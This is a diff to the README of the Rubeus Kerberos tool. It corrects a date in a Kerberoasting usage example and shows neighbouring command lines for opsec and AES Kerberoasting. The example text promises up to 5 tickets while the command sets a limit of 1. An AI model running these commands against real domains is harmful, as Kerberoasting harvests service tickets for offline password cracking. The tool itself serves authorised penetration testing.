@@ -136,8 +136,8 @@ Rubeus is licensed under the BSD 3-Clause license.
         Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
             Rubeus.exe kerberoast /rc4opsec
 
-        Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 02-29-2010, returning up to 5 service tickets:
-            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:02-29-2010 /resultlimit:1
+        Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
+            Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:1
 
         Perform AES Kerberoasting:
             Rubeus.exe kerberoast /aes
